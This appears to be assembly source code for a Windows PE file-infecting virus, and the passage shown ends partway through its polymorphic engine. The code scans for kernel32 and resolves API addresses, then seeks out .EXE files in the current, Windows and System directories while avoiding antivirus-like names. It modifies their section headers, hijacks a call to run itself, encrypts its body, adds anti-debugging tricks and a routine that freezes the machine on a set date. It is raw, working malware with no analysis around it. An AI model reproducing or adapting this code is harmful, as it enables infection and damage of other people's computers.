                  .386p                         ;
                  .model flat, stdcall          ;
                  locals                        ;
                  jumps                         ;
   .data                                        ; 402000H
                                                ;
   start:                                       ;
                  call $+5                      ;
                  pop ebp                       ;
                  sub ebp,402005H               ;
                                                ;
                  cmp dword ptr [ebp+exec_time],'MEMO'
                  je skip_rep                   ;
                                                ;
                  mov dword ptr [ebp+R4],401000H;
                  OldEIP EQU $-04               ;
                                                ;
                  mov dword ptr [ebp+R6],12345678H
                  KEY EQU $-4                   ;
                                                ;
                  mov dword ptr [ebp+exec_time],'MEMO'
                                                ;
                  call Scan_Kern                ;
                                                ;
                  or eax,eax                    ;
                  jz exit                       ;
                                                ;
                  mov esi,ebx                   ;
                  mov edi,eax                   ;
                                                ;
                  call FindApi                  ;
                                                ;
                  or eax,eax                    ;
                  jz exit                       ;
   skip_rep:                                    ;
                  cmp dword ptr [ebp+sd],'KAYA' ;
                  jne exit_process              ;
                                                ;
                  call Payload                  ;
                                                ;
                  call anti                     ;
                                                ;
                  call Scan_dir                 ;
                                                ;
                  jmp exit                      ;
                                                ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
   anti proc                                    ;
                  pushad                        ;
                  push ebp                      ;
                  lea eax,[ebp+offset anti1]    ;
                  push eax                      ;
                  push dword ptr fs:[0]         ;
                  mov dword ptr fs:[0],esp      ;
                  call [ebp+DebugBreak]         ;
                  jmp fuck                      ;
   anti1:                                       ;
                  mov esp,dword ptr [esp+8]     ;
                  pop dword ptr fs:[0]          ;
                  add esp,4                     ;
                  pop ebp                       ;
                  popad                         ;
                  ret                           ;
   anti endp                                    ;
                                                ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
   exit_process proc                            ;
                                                ;
                  xor eax,eax                   ;
                  push eax                      ;
                  call [ebp+_ExitProcess]       ;
                                                ;
   exit_process endp                            ;
                                                ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
   Scan_dir proc                                ;
                  pushad                        ;
                                                ;
                  mov dword ptr [ebp+infected],4;
                                                ;
                  lea eax,[ebp+offset DiReCtOrY0]
                  push eax                      ;
                  push 260                      ;
                  call [ebp+GetCurrentDirectoryA]
                                                ;
                  or eax,eax                    ;
                  jz @@1                        ;
                                                ;
                  call Filez                    ;
                                                ;
                  cmp dword ptr [ebp+infected],0;
                  je @@3                        ;
   @@1:                                         ;
                  lea eax,[ebp+offset DiReCtOrY0]
                  push 260                      ;
                  push eax                      ;
                  call [ebp+GetWindowsDirectoryA]
                                                ;
                  or eax,eax                    ;
                  jz @@2                        ;
                                                ;
                  call Filez                    ;
                                                ;
                  cmp dword ptr [ebp+infected],0;
                  je @@3                        ;
   @@2:                                         ;
                  lea eax,[ebp+offset DiReCtOrY0]
                  push 260                      ;
                  push eax                      ;
                  call [ebp+GetSystemDirectoryA];
                                                ;
                  or eax,eax                    ;
                  jz @@3                        ;
                                                ;
                  call Filez                    ;
   @@3:                                         ;
                  popad                         ;
                  ret                           ;
                                                ;
   Scan_dir endp                                ;
                                                ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
   Scan_Kern proc                               ;
                  pushad                        ;
                                                ;
                  mov eax,0BFF70000h            ;
                  mov dr1,eax                   ;
                  call @@6                      ;
                  or eax,eax                    ;
                  jnz @@1                       ;
                                                ;
                  mov eax,077F00000h            ;
                  mov dr1,eax                   ;
                  call @@6                      ;
                  or eax,eax                    ;
                  jnz @@1                       ;
                                                ;
                  mov eax,077E0000h             ;
                  mov dr1,eax                   ;
                  call @@6                      ;
                  or eax,eax                    ;
                  jnz @@1                       ;
                                                ;
                  xor eax,eax                   ;
   @@1:                                         ;
                  mov dr0,eax                   ;
                  popad                         ;
                  mov eax,dr0                   ;
                  mov ebx,dr1                   ;
                  ret                           ;
   @@6:                                         ;
                  mov esi,eax                   ;
                  cmp word ptr [esi],'ZM'       ;
                  jne @@2                       ;
                                                ;
                  mov edi,dword ptr [esi+3ch]   ;
                  add edi,esi                   ;
                  mov edi,dword ptr [edi+34h]   ;
                                                ;
                  cmp edi,esi                   ;
                  jne @@2                       ;
                                                ;
                  add esi,dword ptr [esi+38h]   ;
                  mov ebx,esi                   ;
                  add ebx,02CB2Ch               ;
   @@4:                                         ;
                  cmp dword ptr [esi],0D22B226Ah;
                  jne @@3                       ;
                                                ;
                  cmp dword ptr [esi+10h],8118247Ch
                  je @@5                        ;
   @@3:                                         ;
                  inc esi                       ;
                  cmp esi,ebx                   ;
                  jb @@4                        ;
   @@2:                                         ;
                  xor eax,eax                   ;
                  ret                           ;
   @@5:                                         ;
                  dec esi                       ;
                  mov eax,esi                   ;
                  ret                           ;
                                                ;
   Scan_Kern endp                               ;
                                                ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
   FindApi proc                                 ;
                  pushad                        ;
                                                ;
                  mov [ebp+KERNEL32],esi        ;
                  mov [ebp+GetProcAddress],edi  ;
                                                ;
                  lea esi,[ebp+ offset api_name];
                  lea edi,[ebp+ offset api_addr];
   @@1:                                         ;
                  push esi                      ;
                  push dword ptr [ebp+KERNEL32] ;
                  call [ebp+GetProcAddress]     ;
                                                ;
                  or eax,eax                    ;
                  jz @@2                        ;
                                                ;
                  stosd                         ;
   @@3:                                         ;
                  inc esi                       ;
                  cmp byte ptr [esi],00h        ;
                  jne @@3                       ;
                                                ;
                  inc esi                       ;
                  cmp byte ptr [esi],0FFh       ;
                  jne @@1                       ;
                                                ;
                  push 1                        ;
                  pop eax                       ;
                                                ;
                  jmp short @@4                 ;
   @@2:                                         ;
                  xor eax,eax                   ;
   @@4:                                         ;
                  mov dr0,eax                   ;
                  popad                         ;
                  mov eax,dr0                   ;
                  ret                           ;
                                                ;
   api_name:      db 'FindFirstFileA',0         ;
                  db 'FindNextFileA',0          ;
                  db 'DeleteFileA',0            ;
                  db 'GetFileSize',0            ;
                  db 'SetFileAttributesA',0     ;
                  db 'GetCurrentDirectoryA',0   ;
                  db 'CreateFileMappingA',0     ;
                  db 'MapViewOfFile',0          ;
                  db 'UnmapViewOfFile',0        ;
                  db 'CreateFileA',0            ;
                  db 'CloseHandle',0            ;
                  db 'FindClose',0              ;
                  db 'GetDriveTypeA',0          ;
                  db 'CopyFileA',0              ;
                  db 'Sleep',0                  ;
                  db 'SetCurrentDirectoryA',0   ;
                  db 'GetWindowsDirectoryA',0   ;
                  db 'GetSystemDirectoryA',0    ;
                  db 'GetFileAttributesA',0     ;
                  db 'GetCommandLineA',0        ;
                  db 'SetFilePointer',0         ;
                  db 'SetEndOfFile',0           ;
                  db 'GetModuleFileNameA',0     ;
                  db 'GetSystemTime',0          ;
                  db 'lstrlen',0                ;
                  db 'DebugBreak',0             ;
                  db 'lstrcat',0                ;
                  db 'VirtualAlloc',0           ;
                  db 'ExitProcess',0            ;
                  db 0FFh                       ;
                                                ;
   FindApi endp                                 ;
                                                ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
   Payload proc                                 ;
                  pushad                        ;
                                                ;
                  lea eax,[ebp+offset time]     ;
                  push eax                      ;
                  call [ebp+GetSystemTime]      ;
                                                ;
                  cmp word ptr [ebp+Day],0Ch    ;
                  jne @@1                       ;
                                                ;
                  cmp word ptr [ebp+Month],07h  ;
                  je @@2                        ;
   @@1:                                         ;
                  popad                         ;
                  ret                           ;
   @@2:                                         ;
                  cli                           ;
                  jmp short $                   ;
   time:                                        ;
                  Year         dw 0             ;
                  Month        dw 0             ;
                  DayOfWeek    dw 0             ;
                  Day          dw 0             ;
                  Hour         dw 0             ;
                  Minute       dw 0             ;
                  Second       dw 0             ;
                  Milliseconds dw 0             ;
                                                ;
   Payload endp                                 ;
                                                ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
   open:          xor eax,eax                   ;
                  push eax                      ;
                  push eax                      ;
                  push 3                        ;
                  push eax                      ;
                  push eax                      ;
                  push 80000000h or 40000000h   ;
                  lea eax,[ebp+offset DiReCtOrY0]
                  push eax                      ;
                  call [ebp+CreateFileA]        ;
                                                ;
                  mov dword ptr [ebp+handle_new_file],eax
                  cmp eax,-1                    ;
                  je ebc                        ;
                                                ;
                  xor eax,eax                   ;
                  push eax                      ;
                  push dword ptr [ebp+offset FileSize]
                  push eax                      ;
                  push 4                        ;
                  push eax                      ;
                  push dword ptr [ebp+handle_new_file]
                  call [ebp+CreateFileMappingA] ;
                                                ;
                  mov dword ptr [ebp+handle_mapping],eax
                  or eax,eax                    ;
                  jz eac                        ;
                                                ;
                  xor eax,eax                   ;
                  push dword ptr [ebp+offset FileSize]  ; file size
                  push eax                      ;
                  push eax                      ;
                  push 2                        ;
                  push dword ptr [ebp+handle_mapping]
                  call [ebp+MapViewOfFile]      ;
                                                ;
                  mov dword ptr [ebp+mem_addr],eax
                  or eax,eax                    ;
                  jz cbm                        ;
                  ret                           ;
                                                ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
   unmap:                                       ;
                  push dword ptr [ebp+mem_addr] ;
                  call [ebp+UnmapViewOfFile]    ;
                  push dword ptr [ebp+handle_mapping]
                  call [ebp+CloseHandle]        ;
   cbm:                                         ;
                  push dword ptr [ebp+handle_mapping]
                  call [ebp+CloseHandle]        ;
                                                ;
                  xor eax,eax                   ;
                  push eax                      ;
                  push eax                      ;
                  push dword ptr [ebp+offset FileSize]
                  push dword ptr [ebp+handle_new_file]
                  call [ebp+SetFilePointer]     ;
                                                ;
                  push dword ptr [ebp+handle_new_file]
                  call [ebp+SetEndOfFile]       ;
   eac:                                         ;
                  push dword ptr [ebp+handle_new_file]
                  call [ebp+CloseHandle]        ;
   ebc:                                         ;
                  xor eax,eax                   ;
                  ret                           ;
                                                ;
                                                ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
   Filez proc                                   ;
                  pushad                        ;
                                                ;
                                                ;
                  lea eax,[ebp+offset exefiles] ;
                  push eax                      ;
                  lea eax,[ebp+offset DiReCtOrY0]
                  push eax                      ;
                  call [ebp+lstrcat]            ;
                                                ;
                  lea eax,[ebp+offset data_area];
                  push eax                      ;
                  lea eax,[ebp+offset DiReCtOrY0]
                  push eax                      ;
                  call [ebp+FindFirstFileA]     ;
                                                ;
                  mov dword ptr [ebp+handle_find],eax
                                                ;
                  cmp eax,-1                    ;
                  je @@1                        ;
   @@6:                                         ;
                  lea esi,[ebp+offset DiReCtOrY0+256]
                  std                           ;
   @@7:                                         ;
                  lodsb                         ;
                  cmp al,'\'                    ;
                  jne @@7                       ;
                  xor al,al                     ;
                  add esi,2                     ;
                  mov byte ptr [esi],al         ;
                                                ;
                  mov edi,esi                   ;
                  cld                           ;
                                                ;
                  lea esi,[ebp+offset FileName] ;
   @@4:                                         ;
                  lodsw                         ;
                  cmp ax,'-F'                   ;
                  je @@2                        ;
                  cmp al,'V'                    ;
                  je @@2                        ;
                  cmp ah,'V'                    ;
                  je @@2                        ;
                  cmp al,'v'                    ;
                  je @@2                        ;
                  cmp ah,'v'                    ;
                  je @@2                        ;
                  stosw                         ;
                  or al,al                      ;
                  jz @@3                        ;
                  jmp short @@4                 ;
   @@3:                                         ;
                  cmp dword ptr [ebp+FileSize],4096*100
                  jae @@2                       ;
                                                ;
                  call infect                   ;
                                                ;
                  cmp dword ptr [ebp+infected],0;
                  je @@5                        ;
   @@2:                                         ;
                  lea eax,[ebp+offset data_area];
                  push eax                      ;
                  push dword ptr [ebp+handle_find]
                  call [ebp+FindNextFileA]      ;
                                                ;
                  or eax,eax                    ;
                  jne @@6                       ;
   @@5:                                         ;
                  push dword ptr [ebp+handle_find]
                  call [ebp+FindClose]          ;
   @@1:                                         ;
                  popad                         ;
                  ret                           ;
                                                ;
                  exefiles       db '\*.EXE',0  ;
                                                ;
   Filez endp                                   ;
                                                ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
   check_file proc                              ;
                  pushad                        ;
                                                ;
                  mov esi,eax                   ;
                                                ;
                  cmp word ptr [esi],'ZM'       ;
                  jne @@1                       ;
                                                ;
                  cmp byte ptr [esi+18h],40h    ;
                  jb @@1                        ;
                                                ;
                  cmp byte ptr [esi+12h],0      ;
                  jne @@1                       ;
   @@4:                                         ;
                  mov byte ptr [esi+12h],'U'    ;
                                                ;
                  mov edi,dword ptr [esi+3Ch]   ;
                  mov dword ptr [ebp+PE],edi    ;
                                                ;
                  add edi,esi                   ;
                  cmp word ptr [edi],'EP'       ;
                  jne @@1                       ;
                                                ;
                  cmp dword ptr [edi+52],400000h;
                  jne @@1                       ;
                                                ;
                  mov ax,word ptr [edi+6]       ;
                  cmp ax,3                      ;
                  jbe @@1                       ;
                                                ;
                  dec ax
                  mov word ptr [ebp+sec],ax     ;
                  and eax,0000FFFFH             ;
                                                ;
                  mov ecx,28h                   ;
                  mul ecx                       ;
                                                ;
                  mov ebx,dword ptr [edi+74h]   ;
                  shl ebx,3                     ;
                  add eax,ebx                   ;
                  add eax,78h                   ;
                  add eax,dword ptr [ebp+PE]    ;
                                                ;
                  mov dword ptr [ebp+last_sec],eax
                  push 1                        ;
                  pop eax                       ;
                                                ;
                  jmp short @@2                 ;
   @@1:                                         ;
                  xor eax,eax                   ;
   @@2:                                         ;
                  mov dr0,eax                   ;
                  popad                         ;
                  mov eax,dr0                   ;
                  ret                           ;
                                                ;
   check_file endp                              ;
                                                ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
   replace_call proc                            ;
                                                ;
             pushad                             ;
                                                ;
             mov ebx,esi                        ;
             add ebx,eax                        ;
   @@1:                                         ;
             cmp esi,ebx                        ;
             jae @@3                            ;
                                                ;
             inc esi                            ;
                                                ;
             cmp esi,ebx                        ;
             jae @@3                            ;
                                                ;
             cmp word ptr [esi],15FFH           ;
             je @@2                             ;
                                                ;
             jmp short @@1                      ;
   @@2:                                         ;
             mov eax,[esi+2]                    ;
             mov [esi+2],edi                    ;
             jmp short @@4                      ;
   @@3:                                         ;
             xor eax,eax                        ;
   @@4:                                         ;
             mov dr0,eax                        ;
             popad                              ;
             mov eax,dr0                        ;
             ret                                ;
                                                ;
   replace_call endp                            ;
                                                ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
   re_crypt proc                                ;
                                                ;
   @@1:                                         ;
                  mov esi,ebx                   ;
                  mov ecx,(offset FIM - offset start + 500)/4+3
                  mov edi,esi                   ;
                  mov ebx,87654321H             ;
                  R6 EQU $-4                    ;
   @@2:                                         ;
                  lodsd                         ;
                  xor eax,ebx                   ;
                  stosd                         ;
                  loop @@2                      ;
                                                ;
                  popad                         ;
                  popf                          ;
                                                ;
                  R3 dw 25FFH                   ;
                  R4 dd 0                       ;
                                                ;
                  re_crypt_len EQU $-@@1        ;
   re_crypt endp                                ;
                                                ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
   infect proc                                  ;
                                                ;
                  pushad                        ;
                                                ;
                  push 80h                      ;
                  lea eax,[ebp+offset DiReCtOrY0]
                  push eax                      ;
                  call [ebp+SetFileAttributesA] ;
                                                ;
                                                ;
                  call open                     ;
                                                ;
                  or eax,eax                    ;
                  jz infect_fail                ;
                                                ;
                  call check_file               ;
                                                ;
                  or eax,eax                    ;
                  jz bad_attrib                 ;
                                                ;
                  call unmap                    ;
                  xor eax,eax                   ;
                  in al,40h                     ;
                  add eax,7000                  ;
                                                ;
                  push dword ptr [ebp+FileSize] ;
                  pop  dword ptr [ebp+oldsize]  ;
                                                ;
                  add dword ptr [ebp+FileSize],eax
                  call open                     ;
                                                ;
                  mov esi,dword ptr [ebp+mem_addr]
                  add dword ptr [ebp+PE],esi    ;
                  mov edi,dword ptr [ebp+PE]    ;
                                                ;
                  add dword ptr [ebp+last_sec],esi
                                                ;
                  mov eax,[edi+80]              ;
   rep_mem:                                     ;
                  lea eax,[eax*2]               ;
                  mov [edi+80],eax              ;
                                                ;
                  cmp eax,7000                  ;
                  jb rep_mem                    ;
                                                ;
                  mov edi,dword ptr [ebp+last_sec]
                  cmp dword ptr [edi],0         ;
                  jz bad_attrib                 ;
                                                ;
                  ;VS + RVA:                    ;
                                                ;
   ;*********************************************
                                                ;
                  mov eax,dword ptr [edi+08h]   ;
   grow_VS:                                     ;
                  lea eax,[eax*4]               ;
                  cmp eax,7000                  ;
                  jbe grow_VS                   ;
                  mov dword ptr [edi+08h],eax   ;
                                                ;
   ;*********************************************
                                                ;
                  mov eax,dword ptr [edi+10h]   ;
                  mov ebx,dword ptr [edi+14h]   ;
                  add ebx,eax                   ;
                  add ebx,200                   ;
   grow_CS:                                     ;
                  lea eax,[eax*8]               ;
                  cmp eax,7000                  ;
                  jbe grow_CS                   ;
                  mov dword ptr [edi+10h],eax   ;
                                                ;
   ;*********************************************
                                                ;
                  or dword ptr [edi+24h],80000000h + 40000000h
                                                ;
   ;*********************************************
                                                ;
                  xor eax,eax                   ;
                  in al,40H                     ;
                  add ebx,eax                   ;
                  in al,40h                     ;
                  add ebx,eax                   ;
                  mov eax,ebx                   ;
                  pushad                        ;
                                                ;
   ;*********************************************
                                                ;
                  mov esi,dword ptr [edi+0Ch]   ;
                  mov edi,dword ptr [edi+14h]   ;
                  sub eax,edi                   ;
                  add esi,eax                   ;
                                                ;
                  add esi,400000H               ;
                  mov [ebp+RVA],esi             ;
                  add [ebp+RVA],04H             ;
                  mov edi,esi                   ;
                  mov esi,dword ptr [ebp+mem_addr]
                  mov eax,dword ptr [ebp+oldsize]
                                                ;
                  call replace_call             ;
                                                ;
                  or eax,eax                    ;
                  jz bad_attrib                 ;
                                                ;
                  mov dword ptr [ebp+OldEIP],eax;
                                                ;
                  popad                         ;
                  add ebx,dword ptr [ebp+mem_addr]
                  mov edi,ebx                   ;
                  mov ecx,(offset FIM - offset start + 500)/4+3
                  mov eax,dword ptr [ebp+RVA]   ;
                  stosd                         ;
                  lea esi,[ebp+offset start]    ;
                  mov ebx,[ebp+RVA]             ;
                  mov ax,609CH                  ;
                  stosw                         ;
                  mov dword ptr [ebp+exec_time],'FUCK'
                                                ;
   ;***************+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
                  call engine                   ;
                                                ;
   ;***************+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
                  push edi                      ;
                  push eax                      ;
                  mov dword ptr [ebp+exec_time],'MEMO'
                  dec dword ptr [ebp+infected]  ;
                  mov eax,dword ptr [ebp+oldsize]
                  add eax,dword ptr [ebp+mem_addr]
                  cmp [ebp+all_ini],eax         ;
                  jbe ????                      ;
                                                ;
                  push eax                      ;
                  mov ebx,[ebp+all_ini]         ;
                  sub ebx,eax                   ;
                  mov eax,ebx                   ;
                  sub eax,7                     ;
                  mov ecx,eax                   ;
                  pop eax                       ;
                  mov edi,eax                   ;
                  xor al,al                     ;
                  rep stosb                     ;
   ????:                                        ;
                  pop eax                       ;
                  pop edi                       ;
                  mov ecx,500d                  ;
                  sub edi,500d                  ;
                  xor al,al                     ;
                  rep stosb                     ;
   bad_attrib:                                  ;
                  call unmap                    ;
   infect_fail:                                 ;
                  mov eax,dword ptr [ebp+FileAttributes]
                  push eax                      ;
                  lea eax,[ebp+offset DiReCtOrY0]
                  push eax                      ;
                  call [ebp+SetFileAttributesA] ;
                                                ;
                  popad                         ;
                  ret                           ;
   infect endp                                  ;
                                                ;
   fuck proc                                    ;
                  mov eax,12345678H             ;
                  call $                        ;
                  mov ecx,071H                  ;
   fuck_esp:                                    ;
                  mov dword ptr [esp],0B0B0B0B0H;
                  add esp,4                     ;
                  loop fuck_esp                 ;
                                                ;
                  call $                        ;
                                                ;
   fuck endp                                    ;

   api_addr:                                    ;
                  FindFirstFileA      dd 0      ;
                  FindNextFileA       dd 0      ;
                  DeleteFileA         dd 0      ;
                  GetFileSize         dd 0      ;
                  SetFileAttributesA  dd 0      ;
                  GetCurrentDirectoryA     dd 0 ;
                  CreateFileMappingA  dd 0      ;
                  MapViewOfFile       dd 0      ;
                  UnmapViewOfFile     dd 0      ;
                  CreateFileA         dd 0      ;
                  CloseHandle         dd 0      ;
                  FindClose           dd 0      ;
                  GetDriveTypeA       dd 0      ;
                  CopyFileA           dd 0      ;
                  Sleep               dd 0      ;
                  SetCurrentDirectoryA     dd 0 ;
                  GetWindowsDirectoryA     dd 0 ;
                  GetSystemDirectoryA dd 0      ;
                  GetFileAttributesA  dd 0      ;
                  GetCommandLineA     dd 0      ;
                  SetFilePointer      dd 0      ;
                  SetEndOfFile        dd 0      ;
                  GetModuleFileNameA  dd 0      ;
                  GetSystemTime       dd 0      ;
                  lstrlen             dd 0      ;
                  DebugBreak          dd 0      ;
                  lstrcat             dd 0      ;
                  VirtualAlloc        dd 0      ;
                  _ExitProcess        dd 0      ;
                                                ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
   ;              ENGINE                        *
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
   engine:                                      ;
                  pushad                        ;
                  mov [ebp+offsetvir],esi
                  mov dword ptr [ebp+len],ecx   ;
                  mov [ebp+_RVA],ebx            ;
                  mov [ebp+all_ini],edi         ;
                                                ;
                  mov word ptr [ebp+seed+1],fs  ;
                                                ;
                  xor dl,dl                     ;
                  xor bl,bl                     ;
   @@1:                                         ;
                  in al,40H                     ;
                  cmp al,0C0H                   ;
                  je put_reg                    ;
                  cmp al,0DBH                   ;
                  je put_reg                    ;
                  cmp al,0D2H                   ;
                  je put_reg                    ;
                  cmp al,00H                    ;
                  je put_reg                    ;
                  jmp short @@1                 ;
   put_reg:                                     ;
                  mov byte ptr [ebp+xor_reg],al ;
                                                ;
                  call chg_garble               ;
                                                ;
                  mov [ebp+offset ini_SEH],edi  ;
   @@30:                                        ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
   ;                        PUSH mem PUSH reg   *
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
                  in al,40H                     ;
                  and al,0001b                  ;
                  jz @@21                       ;
                                                ;
                  mov al,68H                    ;
                  stosb                         ;
                                                ;
                  mov [ebp+offset off1],edi     ;
                  xor eax,eax                   ;
                  stosd                         ;
                  jmp short @@22                ;
   @@21:                                        ;
                  call mov_reg                  ;
                  sub al,08H                    ;
                  stosb                         ;
                  push eax                      ;
                  mov [ebp+offset off1],edi     ;
                  xor eax,eax                   ;
                  stosd                         ;
                  pop eax                       ;
                  add al,08H                    ;
                  mov dl,99H                    ;
                  mov bl,99H                    ;
                  call push_pop                 ;
                  xor dl,dl                     ;
                  xor bl,bl                     ;
   @@22:                                        ;
                  call chg_garble               ;
   @@31:                                        ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
   ;                        XOR ? SUB -> REG    *
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
                  mov bl,byte ptr [ebp+xor_reg] ;
                  or bl,bl                      ;
                  jz @@2                        ;
                                                ;
                  in al,40H                     ;
                  and al,0001H                  ;
                  jz @@19                       ;
                                                ;
                  mov al,33H                    ;
                  stosb                         ;
                                                ;
                  jmp short @@20                ;
   @@19:                                        ;
                  mov al,2BH                    ;
                  stosb                         ;
   @@20:                                        ;
                  mov al,bl                     ;
                  stosb                         ;
   @@2:                                         ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
   ;                        PUSH DWORD PTR FS:[]*
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
                  mov bl,byte ptr [ebp+xor_reg] ;
                  or bl,bl                      ;
                  jz @@3                        ;
                                                ;
                  mov al,64H                    ;
                  stosb                         ;
                                                ;
                  mov al,0FFH                   ;
                  stosb                         ;
                                                ;
                  mov al,bl                     ;
                                                ;
                  cmp al,0C0H                   ;
                  je @@4                        ;
                                                ;
                  cmp al,0DBH                   ;
                  je @@5                        ;
                                                ;
                  cmp al,0D2H                   ;
                  je @@6                        ;
                                                ;
                  jmp exit_process              ;
   @@3:                                         ;
                                                ;
                  call chg_garble               ;
                                                ;
                  mov al,64H                    ;
                  stosb                         ;
                                                ;
                  mov eax,0036FF67H             ;
                  stosd                         ;
                  xor al,al                     ;
   @@7:                                         ;
                  mov cl,al                     ;
                  stosb                         ;
                  jmp short @@8                 ;
   @@4:                                         ;
                  mov al,30H                    ;
                  jmp short  @@7                ;
   @@5:                                         ;
                  mov al,33H                    ;
                  jmp short @@7                 ;
   @@6:                                         ;
                  mov al,32H                    ;
                  jmp short @@7                 ;
   @@8:                                         ;
                                                ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
   ;         MOV DWORD PTR FS:[?],ESP*          ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
                  mov al,64H                    ;
                  stosb                         ;
                                                ;
                  mov bl,byte ptr [ebp+xor_reg] ;
                  or bl,bl                      ;
                  jz @@9                        ;
                                                ;
                  mov al,89H                    ;
                  stosb                         ;
                                                ;
                  mov al,cl                     ;
                  sub al,10H                    ;
                  jmp @@10                      ;
   @@9:                                         ;
                  mov eax,00268967H             ;
                  stosd                         ;
                  xor al,al                     ;
   @@10:                                        ;
                  stosb                         ;
                  call chg_garble               ;
                                                ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
   ;                        EXCEPTION           *
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
                  mov al,0CCH                   ;
                  stosb                         ;
                                                ;
                  call chg_garble               ;
                                                ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
   ;         UNTRACE                            *
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
                  mov al,0E9H                   ;
                  stosb                         ;
                                                ;
                  call rnd                      ;
                  stosd                         ;
                                                ;
                  call chg_garble               ;
                                                ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
   ;         MOV ESP,DWORD PTR [ESP+08]         *
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
                  mov [ebp+ off6],edi           ;
                                                ;
                  call chg_garble               ;
                                                ;
                  mov al,08BH                   ;
                  stosb                         ;
                  in al,40H                     ;
                  and al,0001b                  ;
                  jz @@23                       ;
                  mov ax,2464H                  ;
                  stosw                         ;
                  mov al,08H                    ;
                  stosb                         ;
                  jmp short @@29                ;
   @@23:                                        ;
                  call mov_reg                  ;
                  push eax                      ;
                  cmp al,0C0H                   ;
                  je @@24                       ;
                  cmp al,0C1H                   ;
                  je @@25                       ;
                  cmp al,0C2H                   ;
                  je @@26                       ;
                  cmp al,0C3H                   ;
                  je @@27                       ;
                  jmp exit_process              ;
   @@24:                                        ;
                  mov al,44H                    ;
                  jmp short @@28                ;
   @@25:                                        ;
                  mov al,4CH                    ;
                  jmp short @@28                ;
   @@26:                                        ;
                  mov al,54H                    ;
                  jmp short @@28                ;
   @@27:                                        ;
                  mov al,5CH                    ;
   @@28:                                        ;
                  stosb                         ;
                  mov ax,0824H                  ;
                  stosw                         ;
                  mov al,8BH                    ;
                  stosb                         ;
                  pop eax                       ;
                  add al,20H                    ;
                  stosb                         ;
   @@29:                                        ;
                  call chg_garble               ;
                                                ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
   ;                        XOR ? SUB -> REG    *
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
                  mov bl,byte ptr [ebp+xor_reg] ;
                  or bl,bl                      ;
                  jz @@11                       ;
                                                ;
                  in al,40H                     ;
                  and al,0001H                  ;
                  jz @@16                       ;
                                                ;
                  mov al,33H                    ; XOR
                  stosb                         ;
                                                ;
                  jmp short @@18                ;
   @@16:                                        ;
                  mov al,2BH                    ;
                  stosb                         ;
   @@18:                                        ;
                  mov al,bl                     ;
                  stosb                         ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
   ;                        POP DWORD PTR FS:[?]*
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
   @@11:                                        ;
                  mov al,64H                    ;
                  stosb                         ;
                                                ;
                  or bl,bl                      ;
                  jz @@12                       ;
                                                ;
                  mov al,8FH                    ;
                  stosb                         ;
                                                ;
                  mov al,cl                     ;
                  sub al,30H                    ;
                  jmp @@13                      ;
   @@12:                                        ;
                  mov eax,00068F67H             ;
                  stosd                         ;
                                                ;
                  xor al,al                     ;
   @@13:                                        ;
                  stosb                         ;
                                                ;
                  call chg_garble               ;
                                                ;
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
   ;                        ADD ESP,4           *
   ;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
                                                ;
                  in al,40H                     ;
